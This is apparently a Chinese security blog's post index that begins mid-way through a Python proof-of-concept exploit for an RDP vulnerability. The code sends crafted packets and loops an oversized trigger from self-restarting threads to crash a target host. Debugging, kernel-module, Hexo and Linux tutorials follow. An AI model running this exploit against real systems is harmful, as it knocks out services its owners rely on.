x3c\\x6a\\xba\\x0b\\x20\\xcb\\x9d\\x64\\xb8\\x31\\x14\\xe2\\x70\\x07\\x2c\\xdf\\x9c\\x6f\\xb5\\x3a\\xc4\\xd5\\xb5\\xc9\\x3e\\x9a\\xd7\\xd5\\x30\\xdc\\x0e\\x19\\x89\\xc6\\x08\\x88\\xe1\\xca\\x81\\xa6\\x28\\xdd\\x9c\\x74\\x05\\x11\\xe7\\xe1\\xcc\\xbc\\xc7\\x76\\xdd\\x55\\xe2\\xcc\\xc2\\xcb\\xd3\\xb6\\x48\\x01\\xdd\\xff\\xba\\xca\\x31\\xab\\x26\\x44\\x1c\\xdc\\x06\\x01\\xdf\\xf2\\x90\\x50\\xb8\\x6b\\x8f\\xe8\\x29\\xf0\\xba\\xec\\xfb\\x2d\\xfd\\x7a\\xfc\\x7f\\x57\\xbd\\xea\\x90\\xf7\\xcf\\x92\\x1e\\xc4\\x20\\xd0\\xb6\\x9f\\xd6\\xdc\\xa1\\x82\\xa9\\x6c\\x5e\\x3e\\x83\\x41\\x57\\x73\\xe9\\xe7\\x5a\\x3f\\xda\\x24\\x4f\\x73\\x5e\\xf4\\xe0\\x92\\x24\\xbd\\x0b\\xd0\\x3c\\x49\\x96\\xb5\\xb5\\x05\\x32\\xcb\\x58\\x1d\\x6f\\x97\\x51\\xee\\x0c\\xdc\\x0b\\x2a\\x60\\xef\\x97\\x3e\\x5a\\x30\\x81\\x15\\x91\\xcf\\x11\\x07\\x25\\x2c\\x41\\xdb\\x70\\x72\\xe1\\x75\\xf6\\xa5\\xff\\xe8\\x44\\xe7\\x03\\xe3\\x61\\xaa\\xdb\\xe0\\x07\\x3d\\x07\\x0b\\xe3\\x5c\\x09\\xa9\\x5e\\x10\\xfd\\xcf\\x74\\x9e\\x23\\xf1\\x30\\x86\\x16\\xef\\x25\\x4e\\xfe\\xa4\\x93\\xa5\\x80\\x0a\\x01\\x39\\xcc\\x11\\x7a\\x6e\\x94\\x22\\x5b\\xd8\\xc6\\xc9\\xa8\\xdf\\x13\\x96\\xb3\\x91\\x33\\x6e\\x87\\xbb\\x94\\x63\\x2d\\x88\\x64\\xa7\\x58\\x89\\xda\\xdc\\x7f\\x2a\\xe3\\xa1\\x66\\xe5\\xc8\\x7f\\xc2\\xdb\\xc7\\x7d\\x2f\\xa9\\x46\\x28\\x45\\x69\\xbc\\xac\\x9f\\x85\\x9e\\xb0\\x9f\\x9a\\x49\\xb4\\xb1\\xcb\" # SBC_HandlePersistentCacheList tls.sendall(p) p = b\"\\x03\\x00\\x00\\x28\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x1a\\x1a\\x00\\x17\\x00\\xf0\\x03\\xea\\x03\\x01\\x00\\x00\\x01\\x00\\x00\\x27\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x32\\x00\" # USR_ProcessRemoteFonts tls.sendall(p)def send_data_to_rdplic(tls, arch): if arch == \"32\": p = b\"\\x03\\x00\\x00\\x2e\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xef\\x70\\x14\\x0c\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" elif arch == \"64\": p = b\"\\x03\\x00\\x00\\x2e\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xef\\x70\\x14\" p1 = b\"\\x03\\x00\\x00\\x2e\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xef\\x70\\x14\\x00\" p2 = \"\\x04\\x00\\x00\\x00\\x03\\x00\\x00\\x00\"+\"\\x50\\x00\\x03\\x00\" else: print(\"Make the second arguement '32' or '64' without quotes\") sys.exit() ba = bytearray() ba.extend(map(ord, p+p2)) # # tpkt len ba[2] = struct.pack(\"&gt;h\", len(p+p2))[0] ba[3] = struct.pack(\"&gt;h\", len(p+p2))[1] # # # MCSi len ba[7+6] = len(p2) tls.sendall(bytes(ba)) # trigger p3 = \"\\x04\\x00\\x00\\x00\\x03\\x00\\x00\\x00\"+\"\\x30\\x16\"+'\\x00\\x00'+struct.pack('&lt;I', 0x500)+'a'*0x500 bb = bytearray() bb.extend(map(ord, p1+p3)) # # tpkt len bb[2] = struct.pack(\"&gt;h\", len(p1+p3))[0] bb[3] = struct.pack(\"&gt;h\", len(p1+p3))[1] # # # MCSi len bb[7+6] = (len(p3)&gt;&gt;8)|0x80 bb[7+7] = len(p3)&amp;0xff while 1: tls.sendall(bytes(bb))IP = ''def main(): global IP tls = send_init_packets(IP) send_client_data(tls) print(\"[+] ClientData Packet Sent\") send_channel_packets(tls) print(\"[+] ChannelJoin/ErectDomain/AttachUser Sent\") send_client_info(tls) print(\"[+] ClientInfo Packet Sent\") # print \"try recv\" # tls.recv(8192) # print \"try recv\" # tls.recv(8192) import time time.sleep(5) # Magic action! I don't know why server won't response correctly, but this works. send_confirm_active(tls, None) print(\"[+] ConfirmActive Packet Sent\") send_establish_session(tls) print(\"[+] Session Established\") send_data_to_rdplic(tls, '64') print(\"[+] Vuln Should Trigger\")def checkThread(sleeptimes=2,initThreadsName=[]): for i in range(0,10080):#循环运行 nowThreadsName=[]#用来保存当前线程名称 now=threading.enumerate()#获取当前线程名 for i in now: nowThreadsName.append(i.getName())#保存当前线程名称 for ip in initThreadsName: if ip in nowThreadsName: pass #当前某线程名包含在初始化线程组中，可以认为线程仍在运行 else: print '==='+ip,'stopped，now restart' t=threading.Thread(target=main,args=())#重启线程 t.setName(ip)#重设name t.start() time.sleep(sleeptimes)#隔一段时间重新运行，检测有没有线程downif __name__ == '__main__': if len(sys.argv) !=2: print \"python poc.py 192.168.170.1\" exit(0) else: IP = sys.argv[1] print 'target ip:'+IP names = [1,2,3,4] threads=[] initThreadsName=[]#保存初始化线程组名字 for i in names: t=threading.Thread(target=main,args=()) t.setName(i) threads.append(t) for t in threads: t.start() init=threading.enumerate()#获取初始化的线程对象 for i in init: initThreadsName.append(i.getName())#保存初始化线程组名字 check=threading.Thread(target=checkThread,args=(2,initThreadsName))#用来检测是否有线程down并重启down线程 check.setName('Thread:check') check.start()","categories":[],"tags":[]},{"title":"在ESXi中调试运行虚拟机的vmx程序(How to debug vmx in ESXi)","slug":"debug_vmx_in_esxi","date":"2020-04-21T02:21:48.296Z","updated":"2020-04-21T03:12:10.259Z","comments":true,"path":"2020/04/21/debug_vmx_in_esxi/","link":"","permalink":"http://474172261.github.io/2020/04/21/debug_vmx_in_esxi/","excerpt":"ESXi自带一个子linux系统, 虽然能实现一部分功能, 但是目前为止, 依然没有公开的教程说过如何调试vmx进程, 本篇教程将分享我的研究成果, 帮助大家轻松调试虚拟机进程.","text":"ESXi自带一个子linux系统, 虽然能实现一部分功能, 但是目前为止, 依然没有公开的教程说过如何调试vmx进程, 本篇教程将分享我的研究成果, 帮助大家轻松调试虚拟机进程. 最简单的方法首先, ESXi 自带一个gdbserver, 所以最简单的方法就是直接跑起程序, 再用gdbserver attach它. 跑起虚拟机, 查看vmx对应的进程id 1234567[root@192:~] ps|grep vmx70639 70639 vmx70643 70639 vmx-vthread-70670644 70639 vmx-filtPoll:c770645 70639 vmx-mks:c770646 70639 vmx-svga:c770647 70639 vmx-vcpu-0:c7 gdbserver attach 上去 1234567891011[root@192:~] gdbserver --attach :8808 70639Attached; pid = 70639!gdb_connected()!gdb_connected()!gdb_connected()!gdb_connected()[root@192:~] gdbserver --attach :8808 70639Attached; pid = 70639!gdb_connected()Listening on port 8808 一定要保证出现Listening on port, 不然 ctrl+c 中断, 再重试就好, 目标进程不受影响. 找一台可以使用gdb的机器, 把ESXi中的vmx文件拷贝到机器中, 然后使用如下命令连接 12345678910[root@192 vv]# gdb -qgdb$ file Desktop/vmx-7.0-15843807.elf Reading symbols from /home/vv/Desktop/vmx-7.0-15843807.elf...Missing separate debuginfo for /home/vv/Desktop/vmx-7.0-15843807.elf(no debugging symbols found)...done.gdb$ target remote 192.168.170.240:8808Remote debugging using 192.168.170.240:8808=&gt; 0x8ce2771248 &lt;__libc_ifunc_impl_list+3304&gt;: cmp rax,0xfffffffffffff000 0x8ce277124e &lt;__libc_ifunc_impl_list+3310&gt;: ja 0x8ce2771275 &lt;__libc_ifunc_impl_list+3349&gt;gdb$ 这样就可以正常调试了 不那么简单的办法如果自带的gdbserver 不太好用, 那也可以自己源码静态编译一个gdb版本拷贝过去, 然后直接用. 自己源码编译一个gdb, 或者用我编译好的gdb, 拷贝到esxi上 运行起虚拟机 运行gdb, 一般会告诉你缺失libtinfo.so.5文件或者libncurses.so.5, 最简单的方法就是创建一个软链接, 把它自带的一个文件软链接成缺失的文件.1[root@192:~] ln -s /lib64/libncurses.so.5 /lib64/libtinfo.so.5 或者从centos 7 3.10内核的系统中拷贝一个过去放在lib64目录下. 使用gdb调试123gdb$ file /bin/vmxgdb$ set architecture i386:x86-64:intelgdb$ attach xxxxx 注意事项如果发现ctrl+c不好使, 那么就把虚拟机的cpu个数设置为1. 如果还是不好使, 建议重新选个guest安装测试.","categories":[],"tags":[]},{"title":"linux 内核和用户态通信之 /proc文件系统","slug":"linux-proc","date":"2020-03-29T07:00:54.368Z","updated":"2020-03-29T10:19:39.093Z","comments":true,"path":"2020/03/29/linux-proc/","link":"","permalink":"http://474172261.github.io/2020/03/29/linux-proc/","excerpt":"/proc 文件系统是一个虚拟文件系统，通过它可以使用一种新的方法在 Linux® 内核空间和用户空间之间进行通信。在 /proc 文件系统中，我们可以将对虚拟文件的读写作为与内核中实体进行通信的一种手段，但是与普通文件不同的是，这些虚拟文件的内容都是动态创建的.","text":"/proc 文件系统是一个虚拟文件系统，通过它可以使用一种新的方法在 Linux® 内核空间和用户空间之间进行通信。在 /proc 文件系统中，我们可以将对虚拟文件的读写作为与内核中实体进行通信的一种手段，但是与普通文件不同的是，这些虚拟文件的内容都是动态创建的. /proc 文件系统包含了一些目录（用作组织信息的方式）和虚拟文件。虚拟文件可以向用户呈现内核中的一些信息，也可以用作一种从用户空间向内核发送信息的手段。 创建一个/proc文件在3.8内核之前,使用create_proc_entry创建一个文件,原型如下: 1234567891011121314151617181920struct proc_dir_entry *create_proc_entry( const char *name, mode_t mode, struct proc_dir_entry *parent );//创建一个虚拟文件struct proc_dir_entry &#123; const char *name; // 节点名称 mode_t mode; // 权限,与chmod的一样,可以使用八进制表示 uid_t uid; // File's user id gid_t gid; // File's group id struct inode_operations *proc_iops; // 索引节点操作函数 struct file_operations *proc_fops; // 文件操作函数 struct proc_dir_entry *parent; // 父目录,如果是NULL,就代表/proc目录 ... read_proc_t *read_proc; // 输出给cat的函数 write_proc_t *write_proc; // 读取用户输入的函数 void *data; // 指向private 数据 atomic_t count; // 使用计数 ...&#125;;void remove_proc_entry( const char *name, struct proc_dir_entry *parent );//不仅可以删除节点,还能删除proc_mkdir创建的目录struct proc_dir_entry *proc_mkdir(const char *name, struct proc_dir_entry *parent); //创建一个虚拟目录 parent 参数可以为 NULL（表示 /proc 根目录），也可以是很多其他值 proc_dir_entry 在文件系统中的位置 proc_root_fs /proc proc_net /proc/net proc_bus /proc/bus proc_root_driver /proc/driver 如果我们想创建一个文件为test_modul的虚拟文件,就这样初始化 1234create_proc_entry( \"test_module\", 0644, NULL );或者pt_root = proc_mkdir(\"test_menu\", NULL);pt_entry1 = create_proc_entry(USER_ENTRY1, 0666, pt_root); /proc文件交互函数read_proc 供用户读取的函数 1234567int mod_read( char *page,//数据写入的位置,该page缓冲区在内核 char **start, off_t off, int count,//定义写入的最大字节数 int *eof, //当数据写入完后,需要设置为1 void *data //private 数据 ); 当需要写入多页数据时(一般一页4Kb),需要用到 start,off. write_proc 读取用户的输入 12345int mod_write( struct file *filp, //指向一个打开的文件结构 const char __user *buff, //用户输入的数据,buff在用户空间,内核要读取需要用到copy_from_user unsigned long len, //长度 void *data ); 其它需要用到的函数 1234567891011121314151617181920212223242526/* 创建一个符号链接 */struct proc_dir_entry *proc_symlink( const char *name, struct proc_dir_entry *parent, const char *dest );/* Create a proc_dir_entry with a read_proc_t in one call */struct proc_dir_entry *create_proc_read_entry( const char *name, mode_t mode, struct proc_dir_entry *base, read_proc_t *read_proc, void *data );/* 从内核空间复制数据到用户空间 */unsigned long copy_to_user( void __user *to, const void *from, unsigned long n );/* 从用户空间到内核 */unsigned long copy_from_user( void *to, const void __user *from, unsigned long n );/* 创建虚拟的连续内存块 */void *vmalloc( unsigned long size );/* 释放vmalloc创建的块 */void vfree( void *addr );/* Export a symbol to the kernel (make it visible to the kernel) */EXPORT_SYMBOL( symbol );/* Export all symbols in a file to the kernel (declare before module.h) */EXPORT_SYMTAB 创建内核驱动123456789101112131415161718#include &lt;linux/module.h&gt;/* Defines the license for this LKM */MODULE_LICENSE(\"GPL\");int my_module_init( void )//自定义的初始化函数&#123; printk(KERN_INFO \"my_module_init called. Module is now loaded.\\n\"); return 0;&#125;void my_module_cleanup( void )//自定义的退出函数&#123; printk(KERN_INFO \"my_module_cleanup called. Module is now unloaded.\\n\"); return;&#125;module_init( my_module_init );//声明初始化函数module_exit( my_module_cleanup );//声明退出函数 从3.10内核开始,create_proc_entry() 函数被替换成proc_create() 函数函数区别如下: 123456proc_file = create_proc_entry(\"file\",0600,NULL);if (proc_file) &#123; proc_file-&gt;read_proc = file_read; proc_file-&gt;write_proc = file_write; proc_file-&gt;owner = THIS_MODULE;&#125; 编译安装驱动Makefile 1234567obj-m +&#x3D; simple-km.oall: make -C &#x2F;lib&#x2F;modules&#x2F;&#96;uname -r&#96;&#x2F;build SUBDIRS&#x3D;$(PWD) modulesclean: make -C &#x2F;lib&#x2F;modules&#x2F;&#96;uname -r&#96;&#x2F;build SUBDIRS&#x3D;$(PWD) modules 开头的是tab, 不是空格, 一定要注意 执行如下命令 12345$ make$ insmod simple-km.ko $ dmesg | tail -5 查看最后5行信息$ lsmod$ rmmod simple-km.ko 一个简单的示例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/proc_fs.h&gt;#include &lt;linux/string.h&gt;#include &lt;linux/vmalloc.h&gt;#include &lt;asm/uaccess.h&gt;MODULE_LICENSE(\"GPL\");MODULE_DESCRIPTION(\"Fortune Cookie Kernel Module\");MODULE_AUTHOR(\"VictorV\");#define MAX_COOKIE_LENGTH PAGE_SIZEstatic struct proc_dir_entry *proc_entry;static char *cookie_pot; // 内存缓冲区static int cookie_index; // 指向缓冲区的数据尾部static int next_fortune; // 通过\\0分开字符串,此处用来指向下一个需要输出的缓冲字符串ssize_t fortune_write( struct file *filp, const char __user *buff, unsigned long len, void *data )&#123; int space_available = (MAX_COOKIE_LENGTH-cookie_index)+1; if (len &gt; space_available) &#123; printk(KERN_INFO \"fortune: cookie pot is full!\\n\"); return -ENOSPC; &#125; if (copy_from_user( &amp;cookie_pot[cookie_index], buff, len )) &#123; //从用户空间读取数据到cookie_pot, return -EFAULT; &#125; cookie_index += len; cookie_pot[cookie_index-1] = 0;//将最后一位置零 return len;&#125;int fortune_read( char *page, char **start, off_t off,int count, int *eof, void *data )&#123; int len; if (off &gt; 0) &#123; *eof = 1; return 0; &#125; if (next_fortune &gt;= cookie_index) next_fortune = 0;//超过数据个数,就循环读取 len = sprintf(page, \"%s\\n\", &amp;cookie_pot[next_fortune]);//将一段字符串写入page next_fortune += len; return len;&#125;int init_fortune_module( void )//初始化&#123; int ret = 0; cookie_pot = (char *)vmalloc( MAX_COOKIE_LENGTH );//申请一段内核空间 if (!cookie_pot) &#123; ret = -ENOMEM; &#125; else &#123; memset( cookie_pot, 0, MAX_COOKIE_LENGTH ); proc_entry = create_proc_entry( \"fortune\", 0644, NULL ); if (proc_entry == NULL) &#123; ret = -ENOMEM; vfree(cookie_pot); printk(KERN_INFO \"fortune: Couldn't create proc entry\\n\"); &#125; else &#123; cookie_index = 0; next_fortune = 0; proc_entry-&gt;read_proc = fortune_read;//这里定义输出函数 proc_entry-&gt;write_proc = fortune_write;//定义输入函数 proc_entry-&gt;owner = THIS_MODULE; printk(KERN_INFO \"fortune: Module loaded.\\n\"); &#125; &#125; return ret;&#125;void cleanup_fortune_module( void )&#123; remove_proc_entry(\"fortune\", &amp;proc_root); vfree(cookie_pot); printk(KERN_INFO \"fortune: Module unloaded.\\n\");&#125;module_init( init_fortune_module );module_exit( cleanup_fortune_module ); 效果: 123456789101112[root@plato]# insmod fortune.ko[root@plato]# echo \"Success is an individual proposition. Thomas Watson\" &gt; /proc/fortune[root@plato]# echo \"If a man does his best, what else is there? Gen. Patton\" &gt; /proc/fortune[root@plato]# echo \"Cats: All your base are belong to us. Zero Wing\" &gt; /proc/fortune[root@plato]# cat /proc/fortuneSuccess is an individual proposition. Thomas Watson[root@plato]# cat /proc/fortuneIf a man does his best, what else is there? General Patton[root@plato]#","categories":[],"tags":[]},{"title":"windows 内核调试配置","slug":"windows-debug-setting","date":"2020-03-29T06:43:22.521Z","updated":"2020-03-29T10:16:20.967Z","comments":true,"path":"2020/03/29/windows-debug-setting/","link":"","permalink":"http://474172261.github.io/2020/03/29/windows-debug-setting/","excerpt":"","text":"添加串口到虚拟机安装好虚拟机后, 添加串口设配, 配置如下 配置虚拟机windows系统(简称Guest)按组合键win+r, 输入 msconfig.做如下配置重启虚拟机 配置外部主机(检查Host)找到windbg的快捷方式, 右键属性, 添加参数-b -k com:port=\\\\.\\pipe\\com_1,baud=115200,pipe” 连接调试器在Guest启动后, 在Host打开刚才设置的windbg快捷方式, 如下便连接成功 添加符号","categories":[],"tags":[]},{"title":"Linux双虚拟机调试","slug":"linux-debug-setting","date":"2020-03-29T06:22:04.760Z","updated":"2020-03-29T10:19:44.776Z","comments":true,"path":"2020/03/29/linux-debug-setting/","link":"","permalink":"http://474172261.github.io/2020/03/29/linux-debug-setting/","excerpt":"","text":"准备内核linux kernel source 配置虚拟机 新建一个虚拟机 添加串口, 并做如下配置此虚拟机作为被调试机 克隆虚拟机 修改串口设备的配置,设定为”该端为客户端”, 此为调试机 在被调试机编译内核 解压内核 12tar jxvf linux-2.6.26.tar.bz2cd linux-* 配置编译参数 1make menuconfig 可能的错误 12345678error: curses.h: No such file or directory基于Debian的发行版（如Debian、Ubuntu）：sudo apt-get install libncurses5-dev基于Red Hat的发行版（如RHEL、CentOS）：sudo yum install ncurses-devel如果出现找不到该包，尝试以下设置：vi &#x2F;etc&#x2F;apt&#x2F;source.list添加其它系统的源[源列表地址](http:&#x2F;&#x2F;mirrors.163.com&#x2F;.help&#x2F;debian.html)比如kali,我添加的debian jessie的源 如果提示窗口太小出错,说明你的命令行窗口小了,放大一点再试试.内核调试需要做如下设置: 1234567Kernel Hacking –&gt; compile-time checks and compiler options –&gt; [*] Compile the kernel with debug info [*] Compile the kernel with frame pointers [*] kernel debugging [*] KGDB: kernel debugger–&gt; &lt;*&gt; KGDB: use kgdb over the serial console 完成上述选项后, 直接save后推出. 编译内核 1234make -j 4 bzImage # -j 代表用多少线程, 不要超过cpu的最大线程数make modulesmake modules_installmake install 修改启动表打开 /boot/grub/grub.conf (如果不存在, 就改grub.cfg文件)针对 grub.conf 123456789101112131415161718192021 1 # grub.conf generated by anaconda 2 # 3 # Note that you do not have to rerun grub after making changes to this file 4 # NOTICE: You have a &#x2F;boot partition. This means that 5 # all kernel and initrd paths are relative to &#x2F;boot&#x2F;, eg. 6 # root (hd0,0) 7 # kernel &#x2F;vmlinuz-version ro root&#x3D;&#x2F;dev&#x2F;VolGroup00&#x2F;LogVol00 8 # initrd &#x2F;initrd-version.img 9 #boot&#x3D;&#x2F;dev&#x2F;hda10 default&#x3D;011 timeout&#x3D;512 splashimage&#x3D;(hd0,0)&#x2F;grub&#x2F;splash.xpm.gz13 hiddenmenu14 title CentOS (2.6.26)15 root (hd0,0)16 kernel &#x2F;vmlinuz-2.6.26 ro root&#x3D;&#x2F;dev&#x2F;VolGroup00&#x2F;LogVol00 17 initrd &#x2F;initrd-2.6.26.img18 title CentOS-4 i386 (2.6.9-67.ELsmp)19 root (hd0,0)20 kernel &#x2F;vmlinuz-2.6.9-67.ELsmp ro root&#x3D;&#x2F;dev&#x2F;VolGroup00&#x2F;LogVol00 &lt;---------------------21 initrd &#x2F;initrd-2.6.9-67.ELsmp.img 在kernel那一行末尾添加 “kgdboc=ttyS0,115200”如下图:针对 grub.cfg: 123456789101112131415161718192021menuentry &#39;Ubuntu, with Linux 3.8.0-19-generic&#39; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option &#39;gnulinux-3.8.0-19-generic-advanced-af5e68c6-4f1f-494e-8c35-fc0911ec3564&#39; &#123;recordfail load_video gfxmode $linux_gfx_mode insmod gzio insmod part_msdos insmod ext2 set root&#x3D;&#39;hd0,msdos1&#39; if [ x$feature_platform_search_hint &#x3D; xy ]; then search --no-floppy --fs-uuid --set&#x3D;root --hint-bios&#x3D;hd0,msdos1 --hint-efi&#x3D;hd0,msdos1 --hint-baremetal&#x3D;ahci0,msdos1 af5e68c6-4f1f-494e-8c35-fc0911ec3564 else search --no-floppy --fs-uuid --set&#x3D;root af5e68c6-4f1f-494e-8c35-fc0911ec3564 fi echo &#39;Loading Linux 3.8.0-19-generic ...&#39; linux &#x2F;boot&#x2F;vmlinuz-3.8.0-19-generic root&#x3D;UUID&#x3D;af5e68c6-4f1f-494e-8c35-fc0911ec3564 ro find_preseed&#x3D;&#x2F;preseed.cfg auto noprompt priority&#x3D;critical locale&#x3D;en_US kgdboc&#x3D;ttyS0,115200 kgdbwait quiet ^ | ------------- echo &#39;Loading initial ramdisk ...&#39; initrd &#x2F;boot&#x2F;initrd.img-3.8.0-19-generic&#125; 在新内核对应的内容下添加 “kgdboc=ttyS0,115200” 测试双机调试开启两个虚拟机, 在被调试机上运行命令 1echo hello &gt;/dev/ttyS0 在调试机上运行 1cat /dev/ttyS0 如果调试机没有收到消息, 就实时用/dev/ttyS1, 多试两下就行如果成功了, 记得改grub的配置. 开始调试如果grub没有配置”kgdbwait”参数, 就在被调试机开机后输入 1echo g &gt;/proc/sysrq-tirgger 在调试机里 1234567891011$ gdb linux-3.18.34&#x2F;vmlinux.....(gdb) set remotebaud 115200(gdb) target remote &#x2F;dev&#x2F;ttyS0Remote debugging using &#x2F;dev&#x2F;ttyS0kgdb_breakpoint () at kernel&#x2F;kgdb.c:16741674 wmb(); &#x2F;*Sync point after breakpoint *&#x2F;warning: shared library handler failed to enable breakpoint(gdb) 如果”set remotebaud 115200”的时候出错,就换成”set serial baud 115200” 调试自定义驱动有空再说吧.","categories":[],"tags":[]},{"title":"使用github搭建自己的博客","slug":"build-blog","date":"2020-03-29T03:25:13.016Z","updated":"2020-04-13T06:41:53.202Z","comments":true,"path":"2020/03/29/build-blog/","link":"","permalink":"http://474172261.github.io/2020/03/29/build-blog/","excerpt":"","text":"首先你需要在github创建一个仓储 安装git,npmwindows下载node.js下载git 安装hexo1npm install hexo --save (或者npm install hexo-cli -g) 初始化12hexo init MYBLOGcd MYBLOG “MYBLOG”是目录名称 测试123$ hexo generate$ hexo serverINFO Hexo is running at http:&#x2F;&#x2F;localhost:4000 . Press Ctrl+C to stop. 浏览器访问http://localhost:4000 添加主题访问主题库添加主题, 我比较喜欢Apollo 不过不更新了, 暂时用 next 主题. 配置github推送获取链接修改MYBLOG/_config.yml文件 创建sshkey在git-bash里面使用如下指令（通过在Hexo文件夹右键选择 “Git bash here”打开） 1ssh-keygen -t rsa -b 4096 -C &quot;邮件地址@youremail.com&quot; 然后根据提示enter就好(注意文件保存的位置！！) 登录github, 在Account Settings—&gt;SSH Public keys —&gt; add another public keys中添加你的sshkey.pub文件的内容 测试key 1ssh -T git@github.com 新建文章1hexo n \"网站标题\" 文章文件在Hexo\\source_posts里面，后缀为md这是一个markdown文件，具体语法查看markdown语法 文章内容： title: 文章名date: 2013-05-29 07:56:29 #发表日期updated: 2016-04-06 14:58:03 #更新日期categories: Life #文章分类description: 你对本页的描述tags: [tag1,tag2] #文章标签. 多标签时使用英文逗号隔开photos: #如果使用Fancybox（文章头部展示图片）. 如此设置 URL1URL2#从这里开始 #就是正文 #使用markdown 推送文章1hexo d -g d 是deploy缩写 绑定域名 申请域名 添加选项 在github项目根目录添加CNAME文件, 内容为你的域名(比如 xxx.com) 进入github setting查看往下拉, 出现如下结果就成功了 在文章中添加图片第一种: 是在MYBLOG\\source目录下的images目录里添加图片, 这样在首页也能引用比如文件结构如下: MYBLOG\\source\\images├── b.jpga.jpg 使用![ii1](/a.jpg), ![ii2](/images/b.jpg)引用即可 第二种: 1npm install https://github.com/CodeFalling/hexo-asset-image --save 假设MYBLOG\\source\\_posts里面的结构如下:firstblog├── apppicker.jpg├── logo.jpg└── rules.jpgfirstblog.md目录名必须与md文件名一致, 使用 ![](firstblog/logo.jgp)就可以了.","categories":[],"tags":[]},{"title":"Linux 使用技巧","slug":"linux-skill","date":"2020-03-28T23:53:23.767Z","updated":"2020-04-13T06:37:17.776Z","comments":true,"path":"2020/03/29/linux-skill/","link":"","permalink":"http://474172261.github.io/2020/03/29/linux-skill/","excerpt":"","text":"不定期更新 两个linux文件互传1$ scp -r linux-2.6.26 root@(目标ip)IP:/usr/src/(假设放到/usr/src路径) 将一个本地程序做成一个本地服务程序1$ socat tcp-l:2333,reuseaddr,fork exec:./pwn1 服务端口在2333，使用nc 127.0.0.1 2333连接 快速转换图片格式，修改分辨率12$ convert -resize 100x100 src.jpg dst.jpg$ convert -resize 50%x50% src.jpg dst.jpg 修改文件的用户12345678查看归属：$ ls -l file赋给用户hv$ chown hv:hv file如果需要把某个文件夹下所有都付给某个用户$ chown hv:hv -R dir/* 修改terminal的显示路径1$ vim ~/.bashrc 找到 1234## If this is an xterm set the title to user@host:dircase “$TERM” inxterm|rxvt)PS1&#x3D;”\\e]0;$debianchroot:+($debianchroot)\\u@\\h:\\w\\a$PS1” 将PS1那行修改为(其实就是把w换成W) 1PS1&#x3D;”[\\u@\\h:\\W]\\\\$” 添加环境变量1export PATH=$PATH:/home/victorv 创建terminal的快捷键如果是在kali，terminal是没有快捷键的，到设置的keyboard里面，添加自定义快捷键，键值为 1gnome-terminal 或者安装nautilus-open-terminal gdb改变汇编代码显示方式1(gdb) set disas intel 设置反汇编代码使用的指令集，可选择 intel 指令集或 AT&amp;T指令集. usb驱动相关1234567891011121314查找usb驱动$ sudo lspci…02:00.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL8111/8168B PCI Express Gigabit Ethernet controller (rev 01)$ find /sys | grep drivers.*02:00获取usb设备信息lsusb -tcat /proc/bus/usb/deviceslshw卸载usb驱动tree /sys/bus/usb/driversecho -n “1-1:1.0” &gt; /sys/bus/usb/drivers/ub/unbind centos安装内核header1yum install kernel-devel-$(uname -r) kernel-headers-$(uname -r) 如果遇到没有搜索结果, 可以做如下操作: 查看当前版本12[root@centos~]# cat /etc/redhat-releaseCentOS release 5.6 (Final) 修改文件/etc/yum.repos.d/CentOS-Vault.repo12345678910111213[C(Your Version Number)-base] 比如 [C5.6-base]name&#x3D;CentOS-(Your Version Number) - Basebaseurl&#x3D;http:&#x2F;&#x2F;vault.centos.org&#x2F;(Your Version Number)&#x2F;os&#x2F;$basearch&#x2F;gpgcheck&#x3D;1gpgkey&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;pki&#x2F;rpm-gpg&#x2F;RPM-GPG-KEY-CentOS-5enabled&#x3D;1[C(Your Version Number-updates]name&#x3D;CentOS-(Your Version Number) - Updatesbaseurl&#x3D;http:&#x2F;&#x2F;vault.centos.org&#x2F;(Your Version Number)&#x2F;updates&#x2F;$basearch&#x2F;gpgcheck&#x3D;1gpgkey&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;pki&#x2F;rpm-gpg&#x2F;RPM-GPG-KEY-CentOS-5enabled&#x3D;1 之后再试一次install即可. 更多参考Finding Old kernel-devel Packages For CentOS 添加sudoer 并且取消密码12superuser ALL=(ALL) NOPASSWD:ALLsuperuser ALL=(ALL:ALL) ALL #不取消密码 创建ssh服务12345$ yum -y install openssh-server openssh-clients$ chkconfig sshd on$ service sshd start$ netstat -tulpn | grep :22$ vi /etc/sysconfig/iptables -A RH-Firewall-1-INPUT -m state –state NEW -m tcp -p tcp –dport 22 -j ACCEPT 创建ftp 服务123sudo yum install vsftpdsudo service vsftpd restartchkconfig vsftpd on ubuntu修改内核调试启动项1vi /etc/default/grub 在屁股后面添加 kgdboc=ttyS1,115200 12grep menu /boot/grub/grub.cfggrub-reboot ‘1&gt;3’ 第一个数字1代表第二行的submenu，第二个3代表submenu的第四个（从0开始） 挂起一个进程ctrl+zfg 恢复 打包、解压文件解包使用x,打包使用c tar.xz解包:tar zxvf file.tar.xz 或者:xz -d file.tar.xz &amp;&amp; tar xvf file.tar打包:tar zcvf file.tar.xz .tar解包：tar xvf FileName.tar打包：tar cvf FileName.tar DirName（注：tar是打包，不是压缩！）———————————————.gz解压1：gunzip FileName.gz解压2：gzip -d FileName.gz压缩：gzip FileName .tar.gz 和 .tgz解压：tar zxvf FileName.tar.gz压缩：tar zcvf FileName.tar.gz DirName———————————————.bz2解压1：bzip2 -d FileName.bz2解压2：bunzip2 FileName.bz2压缩： bzip2 -z FileName .tar.bz2解压：tar jxvf FileName.tar.bz2压缩：tar jcvf FileName.tar.bz2 DirName———————————————.bz解压1：bzip2 -d FileName.bz解压2：bunzip2 FileName.bz压缩：未知 .tar.bz解压：tar jxvf FileName.tar.bz压缩：未知———————————————.Z解压：uncompress FileName.Z压缩：compress FileName.tar.Z 解压：tar Zxvf FileName.tar.Z压缩：tar Zcvf FileName.tar.Z DirName———————————————.zip解压：unzip FileName.zip压缩：zip FileName.zip 